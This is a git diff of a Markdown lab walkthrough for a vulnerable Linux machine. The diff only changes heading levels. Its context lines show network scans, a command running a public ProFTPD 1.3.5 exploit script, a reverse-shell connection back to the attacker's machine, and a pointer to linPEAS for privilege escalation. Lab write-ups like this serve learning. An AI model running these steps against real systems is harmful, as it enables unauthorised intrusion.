@@ -5,9 +5,9 @@
 - Category: Linux / Unix
 - Keywords: ProFTPD 1.3.5, PwnKit, RCE
 
-# Reconnaissance
+## Reconnaissance
 
-## Netdiscover
+### Netdiscover
 
 ```bash
 $ sudo netdiscover -r 192.168.122.0/24
@@ -21,7 +21,7 @@ Currently scanning: Finished!   |   Screen View: Unique Hosts
  192.168.122.254 52:54:00:5d:25:8f      1      42  Unknown vendor   
 ```
 
-## Nmap
+### Nmap
 
 ```bash
 $ nmap -sC -sV -v -T4 192.168.122.254
@@ -94,7 +94,7 @@ Found ProFTP 1.3.5 is vulnerable to RCE
 
 Exploit : https://github.com/t0kx/exploit-CVE-2015-3306
 
-# Initial Foothold
+## Initial Foothold
 
 ```bash
 $ python3 exploit.py --host 192.168.122.254 --port 21 --path "/var/www/html"
@@ -171,7 +171,7 @@ connect to [192.168.122.222] from (UNKNOWN) [192.168.122.254] 40868
 www-data@ubuntu:/var/www/html$
 ```
 
-# Privilege Escalation
+## Privilege Escalation
 
 Use linPEAS to search for possible paths to escalate privileges
 
